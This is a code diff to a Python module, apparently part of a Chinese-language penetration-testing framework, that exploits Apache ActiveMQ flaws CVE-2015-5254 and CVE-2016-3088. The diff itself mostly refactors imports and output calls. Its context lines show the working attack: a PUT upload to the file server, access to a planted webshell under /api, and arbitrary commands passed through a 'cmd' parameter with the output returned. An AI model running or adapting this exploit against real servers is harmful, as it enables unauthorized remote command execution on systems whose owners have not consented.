@@ -1,16 +1,16 @@
 # -*- coding:UTF-8 -*-
 import base64,requests,re,random,string
 from requests_toolbelt.utils import dump
-from ClassCongregation import _urlparse
+from ClassCongregation import _urlparse,PocType_,verify
 from operator import methodcaller
-import CodeTest
 ################
 ##--ApacheActiveMQ--##
 #cve_2015_5254 管理界面账号爆破
 #cve_2016_3088 后台上传webshell
 ################
-VULN = ''
-TIMEOUT = ''
+CMD = verify.CMD
+VULN = verify.VULN
+TIMEOUT = verify.TIMEOUT
 class ApacheActiveMQ():
     def __init__(self, url, CMD):
         self.url = url
@@ -47,13 +47,13 @@ class ApacheActiveMQ():
             if int(self.ver) < 5130:
                 self.r = "PoCSuCCeSS"
                 self.info += " [version check] [activemq version: " + self.get_ver + "]"
-            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
     def cve_2016_3088(self):
         self.pocname = "Apache AcitveMQ: CVE-2016-3088"
@@ -93,7 +93,7 @@ class ApacheActiveMQ():
                 self.request = requests.get(self.url + "/api" + self.webshell, headers=self.headers_base64,
                                             timeout=TIMEOUT, verify=False)
                 self.info = "[upload: "+self.url+"/api"+self.webshell+" ]"+" ["+self.pa+"]"
-                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             else:
                 self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.exp,
                                             timeout=TIMEOUT, verify=False)
@@ -108,13 +108,13 @@ class ApacheActiveMQ():
                                             timeout=TIMEOUT, verify=False)
                 self.r = "[webshell: "+self.url+"/api"+self.webshell+"?pwd=password&cmd="+self.CMD+" ]\n"
                 self.r += self.request.text
-                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 print("""
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
 | Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
@@ -124,16 +124,7 @@ print("""
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 
 def check(**kwargs):
-    global VULN,TIMEOUT
-    VULN = kwargs['vuln']
-    TIMEOUT = int(kwargs['timeout'])
-    CodeTest.Verification.CMD = kwargs['cmd']
-    CodeTest.Verification.VULN = kwargs['vuln']
-    if VULN == 'False':
-        ExpApacheActiveMQ = ApacheActiveMQ(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
-    else:
-        ExpApacheActiveMQ = ApacheActiveMQ(_urlparse(kwargs['url']),kwargs['cmd'])
-
+    ExpApacheActiveMQ = ApacheActiveMQ(_urlparse(kwargs['url']),CMD)
     if kwargs['pocname'] != 'ALL':
         func = getattr(ExpApacheActiveMQ, kwargs['pocname'])#返回对象函数属性值，可以直接调用
         func()#调用函数
